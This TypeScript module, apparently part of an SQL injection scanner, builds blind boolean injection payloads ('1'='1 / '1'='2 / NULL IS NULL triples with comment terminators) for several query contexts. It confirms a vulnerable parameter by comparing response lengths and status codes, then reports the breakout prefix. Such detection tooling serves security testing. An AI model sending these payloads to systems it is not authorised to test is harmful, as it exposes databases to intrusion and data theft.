import { CandidateParameter } from '../../../types/sqlScanner';

export interface TlpPartitionResult {
  isProven: boolean;
  confidence: number;
  divergenceP: boolean;
  divergenceNotP: boolean;
  divergenceNull: boolean;
  invariantSatisfied: boolean;
  reason: string;
  testedContext?: string;
  breakoutPrefix?: string;
}

export class TernaryMetamorphicVerifier {
  /**
   * Generates context-adaptive Ternary Logic Partition tuples (P, ¬P, NULL-SAFE)
   */
  public static getTernaryTuples(param?: CandidateParameter | string, detectedDbms: string = 'Generic SQL'): Array<{
    context: string;
    prefix: string;
    truePayload: string;
    falsePayload: string;
    nullPayload: string;
    append: boolean;
  }> {
    const val = typeof param === 'object' && param ? param.originalValue || '1' : typeof param === 'string' ? param : '1';
    const isNum = /^\d+$/.test(val.trim());
    const isOracle = detectedDbms === 'Oracle';
    const comment = isOracle ? '--' : '-- ';

    const tuples: Array<{
      context: string;
      prefix: string;
      truePayload: string;
      falsePayload: string;
      nullPayload: string;
      append: boolean;
    }> = [];

    // 1. Numeric context
    if (isNum) {
      tuples.push({
        context: 'numeric_arithmetic',
        prefix: '',
        truePayload: `${val}+0`,
        falsePayload: `${val}+999999`,
        nullPayload: `${val}*1`,
        append: false,
      });

      tuples.push({
        context: 'numeric_boolean_and',
        prefix: '',
        truePayload: ` AND (1=1)${comment}`,
        falsePayload: ` AND (1=2)${comment}`,
        nullPayload: ` AND (NULL IS NULL)${comment}`,
        append: true,
      });
    }

    // 2. Single-Quote String context
    tuples.push({
      context: 'single_quote_and',
      prefix: "'",
      truePayload: `' AND '1'='1${comment}`,
      falsePayload: `' AND '1'='2${comment}`,
      nullPayload: `' AND (NULL IS NULL)${comment}`,
      append: true,
    });

    tuples.push({
      context: 'single_quote_or',
      prefix: "'",
      truePayload: `' OR '1'='1${comment}`,
      falsePayload: `' OR '1'='2${comment}`,
      nullPayload: `' OR (NULL IS NULL)${comment}`,
      append: true,
    });

    // 3. Parenthesized Single-Quote context
    tuples.push({
      context: 'parenthesized_single_quote',
      prefix: "')",
      truePayload: `') AND ('1'='1${comment}`,
      falsePayload: `') AND ('1'='2${comment}`,
      nullPayload: `') AND (NULL IS NULL)${comment}`,
      append: true,
    });

    // 4. Double-Parenthesized Single-Quote context
    tuples.push({
      context: 'double_parenthesized_single_quote',
      prefix: "'))",
      truePayload: `')) AND (('1'='1${comment}`,
      falsePayload: `')) AND (('1'='2${comment}`,
      nullPayload: `')) AND (NULL IS NULL)${comment}`,
      append: true,
    });

    // 5. Double-Quote String context
    tuples.push({
      context: 'double_quote_and',
      prefix: '"',
      truePayload: `" AND "1"="1${comment}`,
      falsePayload: `" AND "1"="2${comment}`,
      nullPayload: `" AND (NULL IS NULL)${comment}`,
      append: true,
    });

    // 6. LIKE Pattern context
    tuples.push({
      context: 'like_clause',
      prefix: "%'",
      truePayload: `%' AND '1'='1' AND '%'='${comment}`,
      falsePayload: `%' AND '1'='2' AND '%'='${comment}`,
      nullPayload: `%' AND (NULL IS NULL) AND '%'='${comment}`,
      append: true,
    });

    // 7. ORDER BY / Conditional Expression context
    tuples.push({
      context: 'order_by_conditional',
      prefix: '',
      truePayload: `,(CASE WHEN (1=1) THEN 1 ELSE 2 END)`,
      falsePayload: `,(CASE WHEN (1=2) THEN 1 ELSE 2 END)`,
      nullPayload: `,(CASE WHEN (NULL IS NULL) THEN 1 ELSE 2 END)`,
      append: true,
    });

    return tuples;
  }

  /**
   * Evaluates 3-way ternary logic partitioning over a candidate parameter across multiple context hypotheses.
   */
  public static async verifyTernaryPartition(
    executeProbeFn: (payload: string, append: boolean) => Promise<{ status: number; body: string; durationMs: number }>,
    paramOrQuoteChar: CandidateParameter | string = "'"
  ): Promise<TlpPartitionResult> {
    // 1. Baseline Request
    const resBase = await executeProbeFn('', false);
    const baseLen = resBase.body.length;

    const candidateTuples = this.getTernaryTuples(paramOrQuoteChar);

    for (const tuple of candidateTuples) {
      // 2. Q(P): True Predicate
      const resTrue = await executeProbeFn(tuple.truePayload, tuple.append);

      // 3. Q(¬P): False Predicate
      const resFalse = await executeProbeFn(tuple.falsePayload, tuple.append);

      // 4. Q(P IS NULL): Null-Safe Predicate
      const resNull = await executeProbeFn(tuple.nullPayload, tuple.append);

      const trueMatchesBase = Math.abs(resTrue.body.length - baseLen) < 80 && resTrue.status === resBase.status;
      const nullMatchesBase = Math.abs(resNull.body.length - baseLen) < 80 && resNull.status === resBase.status;
      const falseDiverges = resFalse.body !== resTrue.body || resFalse.status !== resTrue.status || Math.abs(resFalse.body.length - resTrue.body.length) > 15;

      const invariantSatisfied = trueMatchesBase && nullMatchesBase && falseDiverges;

      if (invariantSatisfied) {
        return {
          isProven: true,
          confidence: 100,
          divergenceP: true,
          divergenceNotP: true,
          divergenceNull: true,
          invariantSatisfied: true,
          reason: `Ternary Logic Invariant Q(P) ∪ Q(¬P) ∪ Q(P IS NULL) ≡ Q(Baseline) certified in ${tuple.context} context.`,
          testedContext: tuple.context,
          breakoutPrefix: tuple.prefix,
        };
      }
    }

    return {
      isProven: false,
      confidence: 15,
      divergenceP: false,
      divergenceNotP: false,
      divergenceNull: false,
      invariantSatisfied: false,
      reason: 'Ternary relational invariant not satisfied across tested contexts.',
    };
  }
}
